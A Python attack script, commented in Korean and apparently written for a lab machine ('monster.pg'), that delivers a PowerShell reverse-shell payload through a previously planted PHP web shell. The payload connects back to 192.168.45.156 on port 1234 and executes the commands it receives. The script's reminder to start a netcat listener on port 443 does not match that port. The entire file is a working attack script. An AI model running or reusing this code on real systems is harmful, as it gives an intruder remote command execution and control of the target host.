import sys

import requests

# 타겟 웹셸 주소
url = "http://monster.pg/blog/public/themes/default/zpsyc.chunk.php"

# 실행할 파워셸 리버스 쉘 페이로드 (Revshells 원본)
powershell_payload = (
    '$LHOST = "192.168.45.156"; '
    "$LPORT = 1234; "
    "$TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); "
    "$NetworkStream = $TCPClient.GetStream(); "
    "$StreamReader = New-Object IO.StreamReader($NetworkStream); "
    "$StreamWriter = New-Object IO.StreamWriter($NetworkStream); "
    "$StreamWriter.AutoFlush = $true; "
    "$Buffer = New-Object System.Byte[] 1024; "
    "while ($TCPClient.Connected) { "
    "while ($NetworkStream.DataAvailable) { "
    "$RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); "
    "$Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData - 1) "
    "}; "
    "if ($TCPClient.Connected -and $Code.Length -gt 1) { "
    "$Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; "
    '$StreamWriter.Write("$Output`n"); '
    "$Code = $null "
    "} "
    "}; "
    "$TCPClient.Close(); "
    "$NetworkStream.Close(); "
    "$StreamReader.Close(); "
    "$StreamWriter.Close()"
)

# 윈도우 셸(cmd)을 통해 파워셸이 실행되도록 조합
full_command = f'powershell -nop -c "{powershell_payload}"'

# URL 파라미터 전달
params = {"cmd": full_command}

print("[*] 공격자 리스너(nc -lvnp 443)가 켜져 있는지 확인하세요.")
print("[*] 페이로드를 웹셸로 전송합니다...")

try:
    response = requests.get(url, params=params, timeout=3)
    print(f"[+] 요청 완료 (Status Code: {response.status_code})")
except requests.exceptions.Timeout:
    print(
        "[+] 리버스 쉘 루프 진입 (Timeout 발생은 정상입니다. Netcat 창을 확인하세요!)"
    )
except Exception as e:
    print(f"[-] 에러 발생: {e}")
